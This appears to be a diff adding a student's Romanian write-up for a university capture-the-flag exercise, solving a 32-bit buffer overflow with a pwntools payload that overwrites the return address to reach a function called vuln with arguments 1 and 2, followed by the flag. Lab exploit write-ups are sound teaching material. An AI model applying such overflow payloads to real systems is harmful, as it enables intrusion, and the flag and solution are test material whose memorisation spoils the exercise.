@@ -1,0 +1,12 @@
+elchapo187 - Popescu Lucian Ioan - luci.ion771@gmail.com - find_me_if_you_can
+
+Payload-ul e generat cu urmatoarea comanda:
+python -c 'from pwn import *; print "A"*0x20 + p32(0x080485f9) + "AAAA" + p32(1) + p32(2)'
+
+Umplem buffer-ul si vechiul ebp pentru a ajunge la adresa de return. Mai apoi
+schimbam adresa de return cu cea a functiei vuln. Pentru a reusi sa trecem
+de cmp-urile din vuln trebuie ca la ebp+0x8 si ebp+0xc sa punem numerele 1
+si 2. In plus se mai adauga junk la ebp+0x4.
+
+Flagul este:
+iocla_rullzzzz
